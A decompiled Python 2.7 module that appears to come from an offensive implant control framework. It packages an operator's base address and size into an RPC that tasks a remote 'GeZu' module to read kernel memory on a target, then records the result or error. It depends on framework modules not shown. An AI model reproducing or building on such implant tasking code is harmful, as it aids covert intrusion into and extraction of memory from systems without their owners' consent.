# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: Mcl_Cmd_GeZu_KernelMemory_Tasking.py


def TaskingMain(namespace):
    import mcl.tasking
    procedure = mcl.tasking.GetProcedureNumber()
    if procedure == 0:
        return _handleGeZu_KernelMemory(namespace)
    else:
        import mcl.tasking
        mcl.tasking.EchoError('Unknown procedure (%u)' % procedure)
        return False


def _handleGeZu_KernelMemory(namespace):
    import mcl.imports
    import mcl.target
    import mcl.tasking
    import mcl.tasking.technique
    from mcl.object.Message import MarshalMessage
    mcl.imports.ImportWithNamespace(namespace, 'mca.gezu.cmd.GeZu_KernelMemory', globals())
    mcl.imports.ImportWithNamespace(namespace, 'mca.gezu.cmd.GeZu_KernelMemory.tasking', globals())
    lpParams = mcl.tasking.GetParameters()
    tgtParams = mca.gezu.cmd.GeZu_KernelMemory.Params()
    tgtParams.baseAddress = lpParams['baseAddress']
    tgtParams.size = lpParams['size']
    rpc = mca.gezu.cmd.GeZu_KernelMemory.tasking.RPC_INFO_GEZU_KERNELMEMORY
    msg = MarshalMessage()
    tgtParams.Marshal(msg)
    rpc.SetData(msg.Serialize())
    rpc.SetMessagingType('message')
    taskXml = mcl.tasking.Tasking()
    mcl.tasking.OutputXml(taskXml.GetXmlObject())
    res = mcl.tasking.RpcPerformCall(rpc)
    if res != mcl.target.CALL_SUCCEEDED:
        mcl.tasking.RecordModuleError(res, 0, mca.gezu.cmd.GeZu_KernelMemory.errorStrings)
        return False
    return True


if __name__ == '__main__':
    import sys
    if TaskingMain(sys.argv[1]) != True:
        sys.exit(-1)